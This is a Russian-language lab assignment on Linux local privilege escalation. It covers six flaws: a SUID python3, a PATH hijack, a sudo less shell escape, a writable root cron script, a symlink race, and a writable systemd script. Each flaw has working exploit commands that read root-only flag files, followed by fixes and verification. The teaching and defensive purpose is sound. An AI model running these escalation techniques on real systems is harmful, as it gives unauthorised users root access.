## Задание 1. Опасный SUID-бит

### Теория

Бит SUID (`setuid`) на исполняемом файле заставляет процесс выполняться с правами **владельца файла**, а не правами того, кто его запустил. Если SUID установлен на программу, которая умеет выполнять произвольный код (интерпретатор, редактор, архиватор и т. п.), любой локальный пользователь получает возможность выполнить код с правами владельца — обычно root.

В учебном окружении `lab_setup.sh` «по ошибке администратора» установил SUID-бит на системный интерпретатор `python3`.

### Шаг 1. Эксплуатация (роль: student)

```bash
su - student
id
find / -xdev -perm -4000 -type f 2>/dev/null | grep python
python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("id; cat /root/flags/flag1.txt")'
```

Если атака удалась, вывод `id` внутри запущенной оболочки покажет `uid=0(root)`, а команда выведет содержимое `flag1.txt`.

> 📸 **Скриншот 1.1.** Терминал с видимой меткой `[LAB:...]`, вывод команды `find ... | grep python`, показывающий SUID-бит на python3, и результат эксплойта с содержимым `flag1.txt`.

### Шаг 2. Защита (роль: администратор)

Снимите бит SUID — для интерпретатора общего назначения он не нужен никогда:

```bash
exit   # вернуться из-под student
PYBIN=$(readlink -f "$(command -v python3)")
sudo chmod u-s "$PYBIN"
ls -l "$PYBIN"
```

**Общая рекомендация по защите:** регулярно инвентаризировать SUID/SGID-файлы (`find / -perm -4000`) и сверять список с эталонным (пакеты, устанавливающие SUID намеренно — `passwd`, `sudo`, `ping` и т. п.). Любое расхождение — повод для разбирательства.

### Шаг 3. Проверка (роль: student)

```bash
su - student
python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("id")'
```

Ожидаемый результат — исключение `PermissionError: [Errno 1] Operation not permitted`: непривилегированный процесс больше не может сменить uid на 0.

> 📸 **Скриншот 1.2.** Терминал с меткой `[LAB:...]`, повторная попытка эксплойта и видимая ошибка `Operation not permitted`.

## Задание 2. SUID-бинарь + уязвимость `$PATH`

### Теория

Даже «безопасный на вид» SUID-бинарь, написанный самим администратором, может быть уязвим, если он вызывает внешние команды **без указания полного пути** (например, через `system()` на C или `os.system()`/`popen()` без абсолютного пути). Такой вызов ищет команду по переменной окружения `PATH`. Если атакующий поставит в начало `PATH` каталог со своим файлом, имя которого совпадает с вызываемой командой, SUID-процесс выполнит код атакующего с правами владельца файла.

В окружении развёрнут бинарь `/usr/local/bin/sysinfo` (root, SUID), который внутри вызывает `id` без полного пути.

### Шаг 1. Эксплуатация (роль: student)

```bash
su - student
ls -l /usr/local/bin/sysinfo
/usr/local/bin/sysinfo          # обычный, «доверенный» запуск

mkdir -p ~/evil
cat > ~/evil/id <<'EOF'
#!/bin/bash
cat /root/flags/flag2.txt
/bin/id   # чтобы утилита всё ещё выглядела «рабочей»
EOF
chmod +x ~/evil/id

PATH=~/evil:$PATH /usr/local/bin/sysinfo
```

Если атака удалась, вместо (или вместе с) обычного вывода `id` появится содержимое `flag2.txt` — значит, вместо системной `id` выполнился подложенный скрипт, причём с правами root (файл `sysinfo` имеет SUID).

> 📸 **Скриншот 2.1.** Терминал с меткой `[LAB:...]`: содержимое `~/evil/id`, запуск `PATH=~/evil:$PATH /usr/local/bin/sysinfo`, вывод `flag2.txt`.

### Шаг 2. Защита (роль: администратор)

Исправление — на уровне исходного кода: вызывать команды только по полному пути (или явно очищать `PATH` в начале программы). Пересоберите бинарь с исправлением:

```bash
exit   # вернуться из-под student

cat > /tmp/sysinfo_fixed.c <<'EOF'
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

int main(void) {
    printf("Сбор информации о системе...\n");
    /* ИСПРАВЛЕНИЕ: полный путь вместо поиска по $PATH */
    execl("/usr/bin/id", "id", (char *)NULL);
    perror("execl");
    return 1;
}
EOF

sudo gcc -o /usr/local/bin/sysinfo /tmp/sysinfo_fixed.c
sudo chown root:root /usr/local/bin/sysinfo
sudo chmod 4755 /usr/local/bin/sysinfo
```

**Общая рекомендация по защите:** в привилегированном коде никогда не полагаться на `$PATH`; вызывать команды по абсолютному пути (`execve`/`execl`) вместо `system()`/`popen()`, которые порождают `/bin/sh -c "..."` и тем самым снова зависят от окружения.

### Шаг 3. Проверка (роль: student)

```bash
su - student
PATH=~/evil:$PATH /usr/local/bin/sysinfo
```

Ожидаемый результат — выполняется настоящая `/usr/bin/id`, содержимое `flag2.txt` в выводе не появляется, подложенный `~/evil/id` не вызывается.

> 📸 **Скриншот 2.2.** Терминал с меткой `[LAB:...]`, тот же запуск с «отравленным» `$PATH`, но вывод — только легитимный результат `id`, без содержимого флага.

## Задание 3. Опасная запись в sudoers

### Теория

Файл `/etc/sudoers` (и файлы в `/etc/sudoers.d/`) определяют, какие команды пользователь может выполнять через `sudo`, в том числе без пароля (`NOPASSWD`). Если разрешённая команда — это программа с собственным интерактивным режимом (редактор, пейджер, архиватор), пользователь может выйти из «разрешённого» сценария работы программы в произвольную команду, унаследовав привилегии `sudo`. Это задокументированный класс атак (так называемые «GTFOBins»-техники для `sudo`).

В окружении для `student` разрешён `sudo less` без пароля.

### Шаг 1. Эксплуатация (роль: student)

```bash
su - student
sudo -l
sudo less /etc/hostname
```

Находясь внутри пейджера `less`, выполните:

```
!/bin/sh
```

Это команда самого `less` (вызов внешней команды), а не шелла — вводится прямо в режиме просмотра. Откроется интерактивная оболочка. Проверьте привилегии и прочитайте флаг:

```bash
id
cat /root/flags/flag3.txt
exit   # выход из shell, затем q — выход из less
```

> 📸 **Скриншот 3.1.** Терминал с меткой `[LAB:...]`: вывод `sudo -l`, момент выхода в shell из `less` (`!/bin/sh`), вывод `id` с `uid=0`, содержимое `flag3.txt`.

### Шаг 2. Защита (роль: администратор)

Самое надёжное исправление — вообще не выдавать `NOPASSWD` на программы с возможностью выполнять произвольные команды. Если доступ действительно нужен, его нужно сузить до одной безопасной операции, а не до целой программы:

```bash
exit   # вернуться из-под student

sudo visudo -f /etc/sudoers.d/90-lab
```

Замените содержимое файла, например, на безопасный, максимально узкий вариант (просмотр одного конкретного файла без выхода в shell не гарантирован даже так — поэтому в учебных целях правильный ответ почти всегда «убрать доступ полностью»):

```
# Опасная запись удалена по итогам аудита.
# Доступ к less через sudo без пароля не выдаётся.
```

Проверьте синтаксис и права:

```bash
sudo visudo -c -f /etc/sudoers.d/90-lab
sudo chmod 440 /etc/sudoers.d/90-lab
```

**Общая рекомендация по защите:** регулярно выполнять `sudo -l` за каждого пользователя (или просматривать `/etc/sudoers*`) и сверяться со списком программ, у которых есть известные «escape»-техники (less, vi, vim, more, man, find, awk, python и десятки других). Если доступ действительно необходим — использовать `sudoedit`, конкретные аргументы команды без wildcard и, где возможно, тег `NOEXEC`.

### Шаг 3. Проверка (роль: student)

```bash
su - student
sudo -l
sudo less /etc/hostname
```

Ожидаемый результат — `less` в списке `sudo -l` больше не числится, `sudo less ...` запрашивает пароль (которого у `student` для этой команды нет) либо сразу отклоняется с `sudo: a password is required` / `not allowed`.

> 📸 **Скриншот 3.2.** Терминал с меткой `[LAB:...]`: вывод `sudo -l` без записи про `less`, попытка `sudo less /etc/hostname` с отказом.

## Задание 4. Root-cron + каталог с правом записи для всех

### Теория

Планировщик `cron` часто используется для регулярных задач от имени root. Если скрипт, который запускает root по расписанию, лежит в каталоге, доступном для записи непривилегированному пользователю, этот пользователь может подменить содержимое скрипта — и при следующем срабатывании cron код атакующего выполнится с правами root.

В окружении каталог `/opt/lab-cron` (где лежит `healthcheck.sh`, запускаемый root каждую минуту) имеет права `777`.

### Шаг 1. Эксплуатация (роль: student)

```bash
su - student
ls -ld /opt/lab-cron
ls -l /opt/lab-cron/healthcheck.sh
cat /etc/cron.d/lab-healthcheck

cat > /opt/lab-cron/healthcheck.sh <<'EOF'
#!/bin/bash
cp /root/flags/flag4.txt /tmp/flag4_stolen.txt
chmod 644 /tmp/flag4_stolen.txt
date >> /var/log/lab-healthcheck.log
EOF
chmod 755 /opt/lab-cron/healthcheck.sh
```

Подождите до минуты (cron срабатывает раз в минуту) и проверьте результат:

```bash
sleep 65
cat /tmp/flag4_stolen.txt
```

Файл `/tmp/flag4_stolen.txt` появился и читается от имени `student`, хотя исходный `flag4.txt` в `/root/flags/` доступен только root — это и есть эскалация: ваш код выполнился от имени root.

> 📸 **Скриншот 4.1.** Терминал с меткой `[LAB:...]`: права `/opt/lab-cron` (777), подменённое содержимое `healthcheck.sh`, вывод `cat /tmp/flag4_stolen.txt` с содержимым флага.

### Шаг 2. Защита (роль: администратор)

```bash
exit   # вернуться из-под student

sudo rm -f /tmp/flag4_stolen.txt
sudo chmod 755 /opt/lab-cron
sudo chown root:root /opt/lab-cron

# восстановить легитимное содержимое скрипта
sudo tee /opt/lab-cron/healthcheck.sh > /dev/null <<'EOF'
#!/bin/bash
date >> /var/log/lab-healthcheck.log
EOF
sudo chown root:root /opt/lab-cron/healthcheck.sh
sudo chmod 755 /opt/lab-cron/healthcheck.sh
```

**Общая рекомендация по защите:** скрипты, запускаемые от root (через cron, systemd, init), и каталоги, в которых они лежат, должны быть доступны для записи только root. Полезно также держать контрольные суммы «эталонных» root-скриптов и проверять их перед выполнением.

### Шаг 3. Проверка (роль: student)

```bash
su - student
echo "echo PWNED > /tmp/pwn_test" >> /opt/lab-cron/healthcheck.sh
```

Ожидаемый результат — `bash: /opt/lab-cron/healthcheck.sh: Permission denied` (или ошибка `>>` при попытке дозаписи): каталог и файл больше не доступны для записи обычному пользователю.

> 📸 **Скриншот 4.2.** Терминал с меткой `[LAB:...]`: права `/opt/lab-cron` после исправления (755, root:root) и ошибка `Permission denied` при попытке повторной атаки.

## Задание 5. Symlink-атака на привилегированный «читатель» файлов

### Теория

Если привилегированный процесс (запускаемый от root) читает файл по заранее известному пути, не проверяя, что это обычный файл, а не символическая ссылка (`symlink`), непривилегированный пользователь, контролирующий этот путь, может подменить файл симлинком на любой файл в системе — в том числе на такой, который сам по себе ему читать не разрешено (например, файл в `/root`). Процесс root прочитает содержимое по симлинку и может «утечь» его туда, где атакующий уже имеет доступ на чтение.

В окружении root-скрипт `/opt/lab-cron/collector.sh` каждую минуту копирует содержимое `/var/lab/intake/submission.txt` (куда `student` имеет право писать — штатная функция «отправить заявку») в публично читаемый файл `/var/lab/public/last_report.txt`, не проверяя тип файла.

### Шаг 1. Эксплуатация (роль: student)

```bash
su - student
cat /var/lab/public/last_report.txt   # обычное, штатное содержимое

rm -f /var/lab/intake/submission.txt
ln -s /root/flags/flag5.txt /var/lab/intake/submission.txt
ls -l /var/lab/intake/submission.txt
```

Подождите срабатывания cron и проверьте результат:

```bash
sleep 65
cat /var/lab/public/last_report.txt
```

Хотя `student` не может прочитать `/root/flags/flag5.txt` напрямую (права `600`, владелец root), в публично читаемом `last_report.txt` появляется его содержимое — скрипт root прочитал файл по символической ссылке и «слил» его содержимое наружу.

> 📸 **Скриншот 5.1.** Терминал с меткой `[LAB:...]`: попытка прямого чтения `/root/flags/flag5.txt` (Permission denied), создание симлинка, и содержимое флага, появившееся в `/var/lab/public/last_report.txt`.

### Шаг 2. Защита (роль: администратор)

Добавьте в скрипт проверку, что источник — обычный файл, а не симлинк, прежде чем его читать:

```bash
exit   # вернуться из-под student

sudo tee /opt/lab-cron/collector.sh > /dev/null <<'EOF'
#!/bin/bash
SRC="/var/lab/intake/submission.txt"
OUT="/var/lab/public/last_report.txt"

if [ -L "$SRC" ]; then
  echo "$(date): отказ — $SRC является симлинком" >> /var/log/lab-collector-errors.log
  exit 1
fi

cat "$SRC" > "$OUT"
chmod 644 "$OUT"
EOF
sudo chown root:root /opt/lab-cron/collector.sh
sudo chmod 755 /opt/lab-cron/collector.sh

# восстановить штатное содержимое заявки
sudo -u student bash -c 'echo "тестовая заявка" > /var/lab/intake/submission.txt'
```

**Общая рекомендация по защите:** привилегированный код не должен читать или писать файлы по путям, частично или полностью контролируемым непривилегированным пользователем, без проверки `-L` (не симлинк) непосредственно перед операцией; ещё надёжнее — открывать файл с флагом `O_NOFOLLOW` или монтировать такие каталоги с опцией `nosymfollow`, если она доступна в используемом ядре.

### Шаг 3. Проверка (роль: student)

```bash
su - student
rm -f /var/lab/intake/submission.txt
ln -s /root/flags/flag5.txt /var/lab/intake/submission.txt
sleep 65
cat /var/lab/public/last_report.txt
```

Ожидаемый результат — `last_report.txt` не изменился (или пуст/содержит старое значение), содержимое `flag5.txt` в нём не появляется.

```bash
sudo cat /var/log/lab-collector-errors.log   # может потребовать доступа администратора
```

## Задание 6. systemd-юнит с неправильно настроенными правами

### Теория

systemd-сервисы и таймеры часто выполняются от root. Если файл, на который указывает `ExecStart=`, доступен для записи непривилегированному пользователю (даже если сам unit-файл в `/etc/systemd/system/` защищён нормально), этот пользователь может изменить исполняемый скрипт — и при следующем запуске сервиса/таймера код атакующего выполнится от root.

В окружении сервис `lab-worker.service` (и таймер `lab-worker.timer`, срабатывающий каждую минуту) запускает `/opt/lab-systemd/worker.sh`, у которого права `777`.

### Шаг 1. Эксплуатация (роль: student)

```bash
su - student
systemctl status lab-worker.timer
systemctl cat lab-worker.service
ls -l /opt/lab-systemd/worker.sh

cat > /opt/lab-systemd/worker.sh <<'EOF'
#!/bin/bash
cp /root/flags/flag6.txt /tmp/flag6_stolen.txt
chmod 644 /tmp/flag6_stolen.txt
date >> /var/log/lab-worker.log
EOF
chmod 755 /opt/lab-systemd/worker.sh
```

Подождите срабатывания таймера (интервал — минута) и проверьте результат:

```bash
sleep 65
cat /tmp/flag6_stolen.txt
```

> 📸 **Скриншот 6.1.** Терминал с меткой `[LAB:...]`: права `/opt/lab-systemd/worker.sh` (777), подменённое содержимое скрипта, содержимое `/tmp/flag6_stolen.txt` после срабатывания таймера.

### Шаг 2. Защита (роль: администратор)

```bash
exit   # вернуться из-под student

sudo rm -f /tmp/flag6_stolen.txt
sudo tee /opt/lab-systemd/worker.sh > /dev/null <<'EOF'
#!/bin/bash
date >> /var/log/lab-worker.log
EOF
sudo chown root:root /opt/lab-systemd/worker.sh
sudo chmod 700 /opt/lab-systemd/worker.sh
```

Файл не обязан быть доступен на выполнение кому-то, кроме владельца: systemd запускает `ExecStart` от имени, заданного в юните (по умолчанию — root), и для этого достаточно прав владельца.

Дополнительно можно проверить юнит специализированной утилитой аудита:

```bash
sudo systemd-analyze security lab-worker.service
```

**Общая рекомендация по защите:** все файлы, упомянутые в `ExecStart=`, `ExecStartPre=`, `EnvironmentFile=`, `WorkingDirectory=` систем­ного юнита, должны принадлежать root (или сервисному пользователю) и быть недоступны для записи никому другому; сами unit-файлы в `/etc/systemd/system/` должны иметь права не выше `644` и владельца root.

### Шаг 3. Проверка (роль: student)

```bash
su - student
echo "echo PWNED > /tmp/pwn_test2" >> /opt/lab-systemd/worker.sh
```

Ожидаемый результат — `bash: /opt/lab-systemd/worker.sh: Permission denied`: скрипт больше не доступен для записи пользователю `student`.

> 📸 **Скриншот 6.2.** Терминал с меткой `[LAB:...]`: права `/opt/lab-systemd/worker.sh` после исправления (700, root:root) и ошибка `Permission denied` при попытке повторной атаки.
